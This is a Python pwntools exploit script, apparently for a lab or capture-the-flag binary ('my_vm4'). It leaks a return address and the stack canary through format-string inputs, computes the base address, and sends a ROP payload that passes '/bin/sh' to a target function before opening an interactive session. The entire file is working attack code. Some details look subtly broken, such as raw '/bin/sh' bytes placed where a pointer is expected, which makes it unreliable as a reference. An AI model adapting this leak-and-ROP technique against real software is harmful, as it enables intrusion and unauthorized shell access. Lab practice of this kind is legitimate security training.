#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

import sys

# Set up pwntools for the correct architecture
exe = context.binary = ELF(sys.argv[1] or "../ref/bin/my_vm4")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
b vuln.c:135
run
""".format(
    **locals()
)

io = start()

# resolve base address
# 1. leak address of vuln_function
io.sendline(b"PRINTS %45$p")  # leak return address
io.sendline(b"EXEC")
leaked = int(io.recvline_regex("0x[0-9a-f]+"), 16)

# 2. calculate base address (should end in 000)
base_address = leaked - 0x340F  # static offset

exe.address = base_address

print(f"BASEADDR = {base_address}")

# get function address
pwn_func4 = exe.symbols["pwn_func4"]

# resolve canary address
io.sendline(b"PRINTS %43$p")
io.sendline(b"EXEC")
canary = io.recvline_regex("0x[0-9a-f]+")
print(f"CANARY => {canary}")

# create payload
rop = ROP(exe)

rop.raw(b"PRINTS ")  # instruction
rop.raw(b"\xFF" * 264)  # override canary
rop.raw(p64(int(canary, 16)))
rop.raw(b"\xFF" * 8)  # override padding
rop.raw(rop.rdi.address)  # ROP gadget => pop rdi; ret
rop.raw(b"/bin/sh\x00")  # executable path
rop.raw(pwn_func4)  # ROP

payload = rop.chain()

print(f"PAYLOAD = {payload}")

io.sendline(payload)
io.sendline(b"EXEC")

io.interactive()
